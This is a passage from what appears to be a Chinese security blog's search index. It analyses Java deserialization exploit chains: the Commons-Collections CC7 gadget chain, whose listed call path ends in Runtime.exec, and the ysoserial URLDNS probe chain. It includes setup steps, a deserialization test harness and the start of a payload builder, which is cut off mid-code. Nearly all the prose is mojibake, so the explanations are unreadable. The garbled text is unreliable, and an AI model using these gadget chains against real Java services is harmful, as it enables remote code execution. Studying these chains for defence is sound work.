src="https://image.baidu.com/search/down?url=https://cdn.nlark.com/yuque/0/2024/png/25729212/1714747290107-e9dba1e1-7eb7-400b-9db5-a354fc864189.png"></p><p>lementsä»£è¡¨é”®å€¼å¯¹çš„ä¸ªæ•°ï¼Œæˆ‘ä»¬åˆ›å»ºHashtableæ—¶ä¼ å…¥äº†ä¸¤ä¸ªé”®å€¼å¯¹ï¼Œæ•…elements&#x3D;2</p><p><img src="https://image.baidu.com/search/down?url=https://cdn.nlark.com/yuque/0/2024/png/25729212/1714749474176-5dc0367a-abcf-4683-b2e0-05dc99129ba2.png"></p><p>å¯ä»¥çœ‹åˆ°åœ¨readObjectä¸­çš„forå¾ªç¯é‡Œè¯»å‡ºäº†åºåˆ—åŒ–å†™è¿›å»çš„key å’Œ valueå€¼ è¿™é‡Œå¯ä»¥çœ‹åˆ°ç¬¬ä¸€æ¬¡å¾ªç¯è·å–çš„æ˜¯ç¬¬ä¸€æ¬¡hashtable putçš„key å’Œ valueå€¼ç„¶åè·Ÿåˆ°reconstitutionPutæ–¹æ³•çœ‹çœ‹<img src="https://image.baidu.com/search/down?url=https://cdn.nlark.com/yuque/0/2024/png/25729212/1714749848646-ff4fe199-d812-4d22-a3e0-6bdd7b093fdd.png"></p><p>ä»è°ƒè¯•ä¿¡æ¯ä»¥åŠä»£ç å¯ä»¥çœ‹å‡ºç¬¬ä¸€æ¬¡forå¾ªç¯æ˜¯æ²¡æœ‰è¿›å»çš„ï¼Œæ˜¯å› ä¸ºè¿™é‡Œçš„tabæ˜¯ç©ºçš„æ‰€ä»¥æ²¡æ³•è¿›å…¥ï¼Œè€Œæˆ‘ä»¬å‘ç°ä»–åœ¨åé¢åˆç›´æ¥å°†æˆ‘ä»¬ä¼ å…¥è¿‡æ¥çš„keyï¼ˆç¬¬ä¸€ä¸ªä¼ å…¥çš„lazymapï¼‰ å’Œ value  ï¼ˆå€¼ä¸º1ï¼‰åˆç›´æ¥å®ä¾‹åŒ–åˆ°tabé‡Œé¢äº†ã€‚</p><p>æ‰€ä»¥ç»§ç»­è·Ÿè¿›ï¼š</p><p><img src="https://image.baidu.com/search/down?url=https://cdn.nlark.com/yuque/0/2024/png/25729212/1714750203246-2fbb6072-69fd-4cf7-8027-f769d544af3d.png"></p><p>ç­‰åˆ°ç¬¬äºŒæ¬¡ä¼ è¿›æ¥çš„å€¼çš„æ—¶å€™å°±å¯ä»¥è¿›å…¥forå¾ªç¯äº†ï¼Œè¿™å°±æ˜¯ä¸ºä»€ä¹ˆæˆ‘ä»¬éœ€è¦ä¸¤æ¬¡ä¼ å…¥åŒæ ·çš„keyï¼Œè¿™æ—¶ä¼šåœ¨forå¾ªç¯é‡Œè°ƒç”¨e.keyä¹Ÿå°±ç­‰äºLazyMapå¯¹è±¡ï¼ˆç¬¬ä¸€æ¬¡ä¼ å…¥çš„ï¼‰çš„equalsæ–¹æ³•å¹¶ä¸”ä¼ å…¥çš„å‚æ•°keyä¹Ÿæ˜¯LazyMapå¯¹è±¡æ˜¯ç¬¬äºŒæ¬¡hashtable putè¿›æ¥çš„ï¼Œä½†æ˜¯è¿™é‡Œæœ‰ä¸€ä¸ªé—®é¢˜æ˜¯æˆ‘ä»¬å»æŸ¥çœ‹LazyMapå¹¶æ²¡æœ‰å‘ç°equalsæ–¹æ³•ï¼Œäºæ˜¯æˆ‘ä»¬å»æ‰¾ä»–çš„çˆ¶ç±»å‘ç°åœ¨AbstractMapDecoratorè¿™ä¸ªæŠ½è±¡ç±»é‡Œå®ç°äº†equalsæ–¹æ³•æˆ‘ä»¬ç»§ç»­è·Ÿè¿›çœ‹çœ‹</p><p><img src="https://image.baidu.com/search/down?url=https://cdn.nlark.com/yuque/0/2024/png/25729212/1714750240472-95a635f2-3388-484b-baae-be078165c16c.png"></p><p>è¿™é‡Œæˆ‘ä»¬çŸ¥é“LazyMapä¹Ÿæ˜¯putä¸¤ä¸ªä¸€æ ·çš„keyæ˜¯hashmapå¯¹è±¡æ‰€ä»¥è¿™é‡Œä¼šè°ƒç”¨hashmapçš„equalsæ–¹æ³•</p><p>ä½†æ˜¯åŒæ ·ä»–ä¹Ÿæ²¡æœ‰equalsæ–¹æ³•æ‰€ä»¥ç›´æ¥åˆ°å®ƒçš„çˆ¶ç±»AbstractMapé‡Œçœ‹<img src="https://image.baidu.com/search/down?url=https://cdn.nlark.com/yuque/0/2024/png/25729212/1714750954087-89e308f6-13bd-4644-a736-49c0865a9e0b.png"></p><p>æ­¤æ—¶valueå¹¶ä¸ä¸ºç©ºæ‰€ä»¥è¿›å…¥åˆ°equalsæ–¹æ³•ä¸­ä¸”è°ƒç”¨äº†getæ–¹æ³•ï¼Œæ­¤æ—¶çš„må°±æ˜¯ç¬¬äºŒæ¬¡putè¿›æ¥çš„LazyMapå¯¹è±¡ï¼Œ</p><p>æ‰€ä»¥ä¹Ÿå°±è§¦å‘äº†rceï¼ˆåç»­ä¸€ç³»åˆ—çš„è¿‡ç¨‹è·Ÿå…¶å®ƒlazymapå¾ˆåƒï¼‰å°±ä¸å†ä¸€ä¸€è·Ÿäº†ã€‚</p><p>è¡¥å……è¯´æ˜ï¼šè¿™é‡Œåˆ†æçš„æœ‰ç‚¹é—®é¢˜ï¼Œè¿™é‡Œæ¶‰åŠåˆ°hashç¢°æ’çš„é—®é¢˜å»ºè®®å…ˆå‚è€ƒï¼š<a href="https://www.anquanke.com/post/id/248169#h3-4">https://www.anquanke.com/post/id/248169#h3-4</a></p><p><a href="http://myblog.ac.cn/archives/java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E4%B9%8Bcommoncollections7%E5%88%A9%E7%94%A8%E9%93%BE#%E6%8E%A7%E5%88%B6%E5%93%88%E5%B8%8C%EF%BC%88%E9%87%8D%E7%82%B9%EF%BC%89">http://myblog.ac.cn/archives/java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E4%B9%8Bcommoncollections7%E5%88%A9%E7%94%A8%E9%93%BE#%E6%8E%A7%E5%88%B6%E5%93%88%E5%B8%8C%EF%BC%88%E9%87%8D%E7%82%B9%EF%BC%89</a></p><h4 id="é—®é¢˜2"><a href="#é—®é¢˜2" class="headerlink" title="é—®é¢˜2"></a>é—®é¢˜2</h4><p>ä¸ºä»€ä¹ˆè¦åå°„ä¿®æ”¹ChainedTransformerçš„å±æ€§å€¼</p><p>ç»è¿‡è°ƒè¯•æˆ‘ä»¬å‘ç°åœ¨hashtableå¯¹è±¡è¿›è¡Œputçš„æ—¶å€™ä¹Ÿä¼šè°ƒç”¨åˆ°equalsæ–¹æ³•å…·ä½“å‚ç…§é—®é¢˜1çš„åˆ†æ</p><p><img src="https://image.baidu.com/search/down?url=https://cdn.nlark.com/yuque/0/2024/png/25729212/1714751842043-cbf6e4df-fb01-4188-ba28-8094371979c3.png"></p><p>æ‰€ä»¥åœ¨åºåˆ—åŒ–ä¹‹å‰æˆ‘ä»¬å…ˆä¼ ä¸€ä¸ªä¸èƒ½å¤Ÿæ‰§è¡Œå‘½ä»¤çš„invokertransformerå¯¹è±¡ã€‚</p><h4 id="é—®é¢˜3"><a href="#é—®é¢˜3" class="headerlink" title="é—®é¢˜3"></a>é—®é¢˜3</h4><p>ä¸ºä»€ä¹ˆè¦åˆ é™¤laymap2ä¸­çš„keyå€¼å‘¢ï¼Œå…¶å®è¿™é‡Œæˆ‘ä»¬å¯ä»¥å‚è€ƒcc6é“¾ä¸­ä¸ºä»€ä¹ˆåœ¨åºåˆ—åŒ–ä¹‹å‰ç§»é™¤keyä¸€æ ·ï¼Œå› ä¸ºlazyMapæ‰§è¡Œgetæ–¹æ³•éœ€è¦ä¿è¯ä¸å­˜åœ¨è¿™ä¸ªå€¼<img src="https://image.baidu.com/search/down?url=https://cdn.nlark.com/yuque/0/2024/png/25729212/1714755545755-24aa5aa4-28c7-4d7a-9249-ed093b81390d.png"></p><p>è€Œæˆ‘ä»¬é€šè¿‡å‚è€ƒ<a href="https://www.anquanke.com/post/id/248169#h2-6">https://www.anquanke.com/post/id/248169#h2-6</a>æ–‡ç« å’Œè‡ªå·±è°ƒè¯•ä¹Ÿå‘ç°æˆ‘ä»¬åœ¨è¿›è¡Œputçš„æ—¶å€™ä¹Ÿä¼šè°ƒç”¨ä¸Šé¢æ‰€åˆ†æçš„ä¸€ç³»åˆ—æ–¹æ³•å¯¼è‡´æœ€åputæ—¶æœ€åè°ƒç”¨getçš„æ—¶å€™æˆ‘ä»¬ä¼šä¼ å…¥yyæ–¹æ³•æ­¤æ—¶å‘¢mapå¯¹è±¡æ˜¯lazymap2å…¶ä¸­æ˜¯æ²¡æœ‰yyçš„å€¼çš„ä½†æ˜¯</p><p><img src="https://image.baidu.com/search/down?url=https://cdn.nlark.com/yuque/0/2024/png/25729212/1714755927376-4f63cbbb-0a50-40fb-8e30-2de226e52b77.png"></p><p>æˆ‘ä»¬å‘ç°ä»–ä¼šputè¿›å»ï¼Œæ‰€ä»¥æˆ‘ä»¬éœ€è¦åœ¨åºåˆ—åŒ–ä¹‹å‰å°†å…¶å€¼åˆ é™¤æ‰ï¼Œè¿™æ ·åœ¨ååºåˆ—åŒ–çš„æ—¶å€™æˆ‘ä»¬æ‰èƒ½è¿›å…¥åˆ¤æ–­æ¡ä»¶ä»è€Œè°ƒç”¨transformæ–¹æ³•ã€‚</p><p>cc7è°ƒç”¨é“¾</p><p>ç›´æ¥è´´åŸä½œçš„</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">java.util.Hashtable.readObject</span><br><span class="line">    java.util.Hashtable.reconstitutionPut</span><br><span class="line">    org.apache.commons.collections.map.AbstractMapDecorator.equals</span><br><span class="line">    java.util.AbstractMap.equals</span><br><span class="line">    org.apache.commons.collections.map.LazyMap.get</span><br><span class="line">    org.apache.commons.collections.functors.ChainedTransformer.transform</span><br><span class="line">    org.apache.commons.collections.functors.InvokerTransformer.transform</span><br><span class="line">    java.lang.reflect.Method.invoke</span><br><span class="line">    sun.reflect.DelegatingMethodAccessorImpl.invoke</span><br><span class="line">    sun.reflect.NativeMethodAccessorImpl.invoke</span><br><span class="line">    sun.reflect.NativeMethodAccessorImpl.invoke0</span><br><span class="line">    java.lang.Runtime.exec</span><br></pre></td></tr></table></figure>]]></content>
      
      
      <categories>
          
          <category> Javaå®‰å…¨ </category>
          
      </categories>
      
      
        <tags>
            
            <tag> ååºåˆ—åŒ– </tag>
            
            <tag> CCé“¾ </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>URLDNSååºåˆ—åŒ–</title>
      <link href="/2024/12/30/Java%E5%AE%89%E5%85%A8/URLDNS%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/"/>
      <url>/2024/12/30/Java%E5%AE%89%E5%85%A8/URLDNS%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/</url>
      
        <content type="html"><![CDATA[<p>å¯ä»¥çœ‹ä¸€ä¸‹è¿™ä¸¤ç¯‡åˆ†æjavaåºåˆ—åŒ–å’Œååºåˆ—åŒ–çš„æ‰§è¡Œæµç¨‹ã€‚</p><p><a href="https://www.cnpanda.net/sec/893.html">https://www.cnpanda.net/sec/893.html</a></p><p><a href="https://www.cnpanda.net/sec/928.html">https://www.cnpanda.net/sec/928.html</a></p><p>æ­å»ºä»æ–°å¤ä¹ ä»¥å‰å­¦è¿‡çš„javaååºåˆ—åŒ–ï¼Œå°½é‡èƒ½å¤Ÿéƒ½è·Ÿä¸€éä»¥å‰ä¸å¤Ÿç»†è‡´å¤ªè¿‡äºæµ®èºï¼Œå› æ­¤é‡æ–°å¼€å¯ä¸€ä¸ªæ–°çš„å­¦ä¹ ã€‚</p><h2 id="1-ç¯å¢ƒæ­å»º"><a href="#1-ç¯å¢ƒæ­å»º" class="headerlink" title="1.ç¯å¢ƒæ­å»º"></a>1.ç¯å¢ƒæ­å»º</h2><p>åœ¨è¿›è¡Œååºåˆ—åŒ–è°ƒè¯•æ—¶æˆ‘ä»¬å…ˆ<a href="https://github.com/frohoff/ysoserial">ysoserial</a>é¡¹ç›®è¿›è¡Œç¯å¢ƒæ­å»ºï¼Œä¸‹é¢å°±æ­å»ºé‡åˆ°çš„é—®é¢˜åšä¸€ä¸ªè®°å½•ã€‚</p><p>é¦–å…ˆç›´æ¥ä¸‹è½½å‹ç¼©åŒ…ç„¶åå°†é¡¹ç›®æ‹–è¿›ideaï¼Œä¹‹åå°†pom.xmæ–‡ä»¶ä¸­çš„ä¾èµ–jarå…¨éƒ¨ä¸‹è½½ã€‚</p><h3 id="ç¬¬ä¸€ä¸ªé—®é¢˜"><a href="#ç¬¬ä¸€ä¸ªé—®é¢˜" class="headerlink" title="ç¬¬ä¸€ä¸ªé—®é¢˜"></a>ç¬¬ä¸€ä¸ªé—®é¢˜</h3><p>å°±æ˜¯ä¾èµ–åŒ…æœ‰çš„åŠ è½½ä¸å‡ºæ¥å¯èƒ½æ˜¯å› ä¸ºæˆ‘ä»¬é…ç½®çš„é˜¿é‡Œäº‘çš„é•œåƒæ²¡æœ‰ä¾èµ–çš„åŸå› æ‰€ä»¥æˆ‘ä»¬å°±æ‰‹åŠ¨å°†jarå¯¼å…¥åˆ°æœ¬åœ°mavenä»“åº“ã€‚è¿™é‡Œå‚è€ƒ<a href="https://blog.csdn.net/Ming_super/article/details/128728472">https://blog.csdn.net/Ming_super&#x2F;article&#x2F;details&#x2F;128728472</a>è¿›è¡Œå¯¼å…¥</p><p>é¦–å…ˆæ‰¾åˆ°mavençš„å®˜ç½‘ç„¶åæ‰¾åˆ°è‡ªå·±æ‰€éœ€è¦çš„ä¾èµ–</p><p><img src="https://image.baidu.com/search/down?url=https://cdn.nlark.com/yuque/0/2024/png/25729212/1713846520144-c8a0632e-a6d5-4cdd-9bc9-1751ec77ce83.png"></p><p>å°†çº¢ç®­å¤´æ‰€æŒ‡çš„jaråŒ…ä¸‹è½½ä¸‹æ¥ã€‚ç„¶åæ‰“å¼€windows cmd  å°†jaråŒ…å¯¼å…¥åˆ°æœ¬åœ°ä»“åº“ã€‚</p><p>è¾“å…¥ä»¥ä¸‹å‘½ä»¤ä¾‹å¦‚ï¼š</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">mvn install:install-file</span><br><span class="line">        -Dfile=D:\mybatis-<span class="number">3.5</span><span class="number">.10</span>.jar</span><br><span class="line">        -DgroupId=org.mybatis</span><br><span class="line">        -DartifactId=mybatis </span><br><span class="line">        -Dversion=<span class="number">3.5</span><span class="number">.10</span> </span><br><span class="line">        -Dpackaging=jar</span><br></pre></td></tr></table></figure><p>ä¹‹åå°±å¯ä»¥åœ¨pom.xmlæ–‡ä»¶ä¸­æ­£å¸¸åŠ è½½äº†ã€‚</p><h3 id="ç¬¬äºŒä¸ªé—®é¢˜"><a href="#ç¬¬äºŒä¸ªé—®é¢˜" class="headerlink" title="ç¬¬äºŒä¸ªé—®é¢˜"></a>ç¬¬äºŒä¸ªé—®é¢˜</h3><p>å°±æ˜¯æˆ‘ä»¬åœ¨è¿è¡Œysoserialä¸»ç¨‹åºä¸€ç›´æŠ¥é”™æ‰¾ä¸åˆ°javaç¨‹åºåŒ…ï¼Œä½†æ˜¯é€šè¿‡æ’æŸ¥å‘ç°æ˜æ˜å·²ç»å¯¼å…¥è¿›æ¥äº†ã€‚</p><p>è¿™é‡Œè§£å†³åŠæ³•ï¼š</p><p><img src="https://image.baidu.com/search/down?url=https://cdn.nlark.com/yuque/0/2024/png/25729212/1713846707666-96b1ee34-0ec7-481f-b70a-d432a380655c.png"></p><p><img src="https://image.baidu.com/search/down?url=https://cdn.nlark.com/yuque/0/2024/png/25729212/1713846755542-a2acd9be-7a79-4fb2-97a2-71d75842c4b6.png"></p><p>æ‰“å¼€ideaé¡¹ç›®ä¸­çš„Project Structure å°†ç®­å¤´æ‰€æŒ‡çš„åœ°æ–¹æ”¹æˆç›¸å¯¹åº”çš„ç„¶ååœ¨settingä¸­å°†æœ¬åœ°çš„javaç¯å¢ƒä¸é¡¹ç›®ç¯å¢ƒä¹Ÿè®¾ç½®åŸåŒæ ·çš„<img src="https://image.baidu.com/search/down?url=https://cdn.nlark.com/yuque/0/2024/png/25729212/1713846810061-f2252040-e8c1-42ab-ad29-a2c1b44e0157.png"></p><p>ä¹‹åå°±å¯ä»¥è¿è¡Œç¨‹åºäº†ã€‚</p><p>åœ¨è¿è¡Œç¨‹åºè¾“å…¥å‚æ•°å¯ä»¥ç›´æ¥åœ¨é¡¹ç›®ä¸­è¿›è¡Œç¼–è¾‘</p><p><img src="https://image.baidu.com/search/down?url=https://cdn.nlark.com/yuque/0/2024/png/25729212/1713846852331-f630cc9f-ddb0-404f-af84-0bbcc0adef30.png"></p><p><img src="https://image.baidu.com/search/down?url=https://cdn.nlark.com/yuque/0/2024/png/25729212/1713846884585-98d25eba-5449-40d9-8558-3836b9e20673.png"></p><p>è¿™é‡Œä»¥ç”Ÿæˆurldnsé“¾ä¸ºä¾‹å…¶å®ƒçš„å¯ä»¥è‡ªè¡Œç™¾åº¦ã€‚</p><h2 id="javaååºåˆ—åŒ–çš„è¿‡ç¨‹"><a href="#javaååºåˆ—åŒ–çš„è¿‡ç¨‹" class="headerlink" title="javaååºåˆ—åŒ–çš„è¿‡ç¨‹"></a>javaååºåˆ—åŒ–çš„è¿‡ç¨‹</h2><p>å‚è€ƒï¼š<a href="https://chenlvtang.top/2022/09/18/Java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%B5%81%E7%A8%8B%E5%88%86%E6%9E%90%E5%8F%8AresolveClass/">https://chenlvtang.top/2022/09/18/Java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%B5%81%E7%A8%8B%E5%88%86%E6%9E%90%E5%8F%8AresolveClass/</a></p><p><img src="https://image.baidu.com/search/down?url=https://cdn.nlark.com/yuque/0/2024/png/25729212/1724413722961-dd6cbb05-5809-4b6a-9ae9-22f63f62cc7f.png"></p><h2 id="è°ƒç”¨å›¾ï¼š"><a href="#è°ƒç”¨å›¾ï¼š" class="headerlink" title="è°ƒç”¨å›¾ï¼š"></a>è°ƒç”¨å›¾ï¼š</h2><p><img src="https://image.baidu.com/search/down?url=https://cdn.nlark.com/yuque/0/2024/png/25729212/1724417545879-786e96dc-7106-451a-a127-11550f04b107.png"></p><h2 id="2-URLDNSé“¾"><a href="#2-URLDNSé“¾" class="headerlink" title="2.URLDNSé“¾"></a>2.URLDNSé“¾</h2><p>URLDNS å°±æ˜¯ysoserialä¸­â¼€ä¸ªåˆ©â½¤é“¾çš„åå­—ï¼Œä½†å‡†ç¡®æ¥è¯´ï¼Œè¿™ä¸ªå…¶å®ä¸èƒ½ç§°ä½œâ€œåˆ©â½¤é“¾â€ã€‚å› ä¸ºå…¶å‚æ•°ä¸ </p><p>æ˜¯â¼€ä¸ªå¯ä»¥â€œåˆ©â½¤â€çš„å‘½ä»¤ï¼Œâ½½ä»…ä¸ºâ¼€ä¸ªURLï¼Œå…¶èƒ½è§¦å‘çš„ç»“æœä¹Ÿä¸æ˜¯å‘½ä»¤æ‰§â¾ï¼Œâ½½æ˜¯â¼€æ¬¡DNSè¯·æ±‚ã€‚ </p><p>è™½ç„¶è¿™ä¸ªâ€œåˆ©â½¤é“¾â€å®é™…ä¸Šæ˜¯ä¸èƒ½â€œåˆ©â½¤â€çš„ï¼Œä½†å› ä¸ºå…¶å¦‚ä¸‹çš„ä¼˜ç‚¹ï¼Œâ¾®å¸¸é€‚åˆæˆ‘ä»¬åœ¨æ£€æµ‹ååºåˆ—åŒ–æ¼æ´æ—¶ä½¿â½¤ï¼š </p><p>ä½¿â½¤Javaå†…ç½®çš„ç±»æ„é€ ï¼Œå¯¹ç¬¬ä¸‰â½…åº“æ²¡æœ‰ä¾èµ– </p><p>åœ¨â½¬æ ‡æ²¡æœ‰å›æ˜¾çš„æ—¶å€™ï¼Œèƒ½å¤Ÿé€šè¿‡DNSè¯·æ±‚å¾—çŸ¥æ˜¯å¦å­˜åœ¨ååºåˆ—åŒ–æ¼æ´</p><p>ysoserialå¦‚ä½•ç”Ÿæˆurldnsé“¾çš„è¿‡ç¨‹å¯ä»¥å‚è€ƒï¼š</p><p><a href="https://www.cnblogs.com/gk0d/p/16874157.html">https://www.cnblogs.com/gk0d/p/16874157.html</a></p><h3 id="è°ƒç”¨è¿‡ç¨‹ï¼š"><a href="#è°ƒç”¨è¿‡ç¨‹ï¼š" class="headerlink" title="è°ƒç”¨è¿‡ç¨‹ï¼š"></a>è°ƒç”¨è¿‡ç¨‹ï¼š</h3><p>é¦–å…ˆåˆ¤æ®µæ˜¯å¦ä¼ å…¥äº†ä¸¤ä¸ªå‚æ•°ï¼Œå¦‚æœä¸æ˜¯åˆ™æ‰“å°å¸®åŠ©ä¿¡æ¯ï¼›æ˜¯çš„è¯ä¼šä¾æ¬¡åˆ†åˆ«èµ‹å€¼ç»™payloadTypeå’Œcommandå˜é‡ã€‚<img src="https://image.baidu.com/search/down?url=https://cdn.nlark.com/yuque/0/2024/png/25729212/1714224687545-3edda390-9a0c-45d9-8a0c-4c684dbbd91c.png"></p><p>ä¹‹åå®ä¾‹åŒ–äº†ä¸€ä¸ªéœ€è¦ç»§æ‰¿ObjectPayloadç±»çš„ç±»å®ä¾‹åŒ–å¯¹è±¡ï¼Œè·Ÿè¿›ä¸€ä¸‹getPayloadClassæ–¹æ³•ï¼Œåœ¨ysoserial.payloads.ObjectPayload.Utilsä¸‹</p><p><img src="https://image.baidu.com/search/down?url=https://cdn.nlark.com/yuque/0/2024/png/25729212/1714224728921-ed2aa8ef-b5cc-4370-8fbb-6a7e6f62a6a6.png"></p><p>åœ¨ç®­å¤´æ‰€æŒ‡çš„åœ°æ–¹é€šè¿‡åå°„è·å–äº† URLDNSçš„classå¯¹è±¡ï¼Œç„¶åå®ä¾‹åŒ–è·å–URLDNSå¯¹è±¡å¹¶è°ƒç”¨ getobjectæ–¹æ³•</p><p><img src="https://image.baidu.com/search/down?url=https://cdn.nlark.com/yuque/0/2024/png/25729212/1714224856548-2df67463-1926-4d9f-a13b-df89d995aa2e.png"></p><p>é€šè¿‡è·Ÿè¿›getobjectæ–¹æ³•å‘ç°å…¶è¿”å›äº†ä¸€ä¸ªhashmapå¯¹è±¡</p><p><img src="https://image.baidu.com/search/down?url=https://cdn.nlark.com/yuque/0/2024/png/25729212/1714224908824-b3a13ef8-9953-4045-93f6-7e809ff94bd5.png"></p><p>ç„¶ååºåˆ—åŒ–è¾“å‡ºè¯¥å¯¹è±¡</p><p><img src="https://image.baidu.com/search/down?url=https://cdn.nlark.com/yuque/0/2024/png/25729212/1714224970963-b7bcbbb8-34e1-41c2-a6f3-ea5fb0ba0b0f.png"></p><p>ä»¥ä¸Šå°±æ˜¯ysoserialç”Ÿæˆurldnsçš„è¿‡ç¨‹ï¼Œä¸‹é¢ç€é‡åˆ†æä»¥ä¸‹ä¸ºä»€ä¹ˆååºåˆ—åŒ–å¯ä»¥è§¦å‘ä¸€æ¬¡dnsè¯·æ±‚ã€‚ä¸Šæ–‡å·²ç»è¯´åˆ°äº†æœ€ååºåˆ—åŒ–çš„æ˜¯hashmapå¯¹è±¡æ‰€ä»¥æˆ‘ä»¬å¯ä»¥ç›´æ¥çœ‹hashmapçš„readobjectæ–¹æ³•</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">unserial</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> IOException, ClassNotFoundException &#123;</span><br><span class="line">        <span class="type">ObjectInputStream</span> <span class="variable">o</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ObjectInputStream</span>(<span class="keyword">new</span> <span class="title class_">FileInputStream</span>(<span class="string">&quot;D:\\shentougongju\\ysoserial\\test.bin&quot;</span>));</span><br><span class="line">        <span class="type">Object</span> <span class="variable">o1</span> <span class="operator">=</span> o.readObject();</span><br><span class="line">        System.out.println(o1);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>æˆ‘ä»¬åœ¨hashmapçš„readobjectä¸­ä¸‹ä¸€ä¸ªæ–­ç‚¹è¿›è¡Œè°ƒè¯•</p><p><img src="https://image.baidu.com/search/down?url=https://cdn.nlark.com/yuque/0/2024/png/25729212/1714226809705-1373e80c-42da-43cb-96bf-f6e194c1f1b9.png"></p><p>æˆ‘ä»¬å¯ä»¥å‘ç°æœ€ç»ˆè°ƒç”¨äº†ä¸€ä¸ªputvalæ–¹æ³•ï¼Œå®ƒé‡Œé¢å¯¹keyè¿›è¡Œäº†hashæ–¹æ³•ï¼Œè€Œæˆ‘ä»¬çŸ¥é“è¿™ä¸ªkeyæ˜¯æˆ‘ä»¬åºåˆ—åŒ–è¿›å»çš„URLå¯¹è±¡ç»§ç»­è·Ÿè¿›å»</p><p><img src="https://image.baidu.com/search/down?url=https://cdn.nlark.com/yuque/0/2024/png/25729212/1714226956902-caa74e7f-b275-4ed1-9462-7a9fe21ae4a6.png"></p><p>å‘ç°å¯¹keyåšäº†ä¸€ä¸ªåˆ¤æ–­ï¼Œå¦‚æœä¸ä¸ºç©ºçš„è¯å°±è°ƒç”¨keyå¯¹è±¡çš„hashcodeæ–¹æ³•ï¼Œè€Œè¿™é‡Œæˆ‘ä»¬çŸ¥é“keyæ˜¯urlå¯¹è±¡ï¼Œæ‰€ä»¥è°ƒç”¨çš„æ˜¯URLå¯¹è±¡çš„hashcodeæ–¹æ³•ç»§ç»­è·Ÿè¿›å»</p><p><img src="https://image.baidu.com/search/down?url=https://cdn.nlark.com/yuque/0/2024/png/25729212/1714227099512-fcb456ae-9394-47eb-af59-b2fc6a283f27.png"></p><p>è¿™é‡Œåˆ¤æ–­hashcodeæ˜¯å¦ç­‰äº-1å¦‚æœä¸ç­‰äº-1å°±è¿”å›hashcodeå¦‚æœç­‰äº-1å°±ç»§ç»­è°ƒç”¨handlerçš„hashcodeæ–¹æ³•ï¼Œè¿™é‡Œé€šè¿‡ä¸Šæ–‡çš„getobjectæ–¹æ³•å¯ä»¥çŸ¥é“ä¼ å…¥çš„handleræ˜¯URLStreamHandlerå¯¹è±¡ç»§ç»­è·Ÿè¿›å»ï¼š</p><p><img src="https://image.baidu.com/search/down?url=https://cdn.nlark.com/yuque/0/2024/png/25729212/1714227369926-1b0616ed-65b5-447d-8f1e-85f1b6a3fce8.png"></p><p>å¯ä»¥çœ‹åˆ°ç¬¬10è¡Œè°ƒç”¨äº†getHostAddressæ–¹æ³•è·Ÿè¿›å»çœ‹çœ‹ï¼š</p><p><img src="https://image.baidu.com/search/down?url=https://cdn.nlark.com/yuque/0/2024/png/25729212/1714227492916-5798e9bc-3026-41fd-82ce-2d24029e79c8.png"></p><p>ç»§ç»­è·Ÿè¿›</p><p><img src="https://image.baidu.com/search/down?url=https://cdn.nlark.com/yuque/0/2024/png/25729212/1714227509620-598dd861-441a-4615-90fc-d14bf1509353.png"></p><p>å‘ç°è°ƒç”¨getBynameæ–¹æ³• è¿™â¾¥ InetAddress.getByName(host) çš„ä½œâ½¤æ˜¯æ ¹æ®ä¸»æœºåï¼Œè·å–å…¶IPåœ°å€ï¼Œåœ¨â½¹ç»œä¸Šå…¶å®å°±æ˜¯â¼€æ¬¡ DNSæŸ¥è¯¢ã€‚</p><p>è¿™é‡Œæ˜¯ysoserialçš„payloadæ€»ç»“ä¸€ä¸‹è°ƒç”¨é“¾</p><ol><li>HashMap-&gt;readObject()</li><li>PutVal-&gt;hash()</li><li>URL-&gt;hashCode()</li><li>URLStreamHandler-&gt;hashCode()</li><li>URLStreamHandler-&gt;getHostAddress()</li><li>InetAddress-&gt;getByName()</li></ol><p>ä¸‹é¢æˆ‘ä»¬æ¥çœ‹ä¸€ä¸‹ç½‘ä¸Šå¸¸è§çš„payloadä¸ysoserialçš„åŒºåˆ«</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">       <span class="type">HashMap</span> <span class="variable">map</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">HashMap</span>();</span><br><span class="line">       <span class="type">URL</span> <span class="variable">url</span> <span 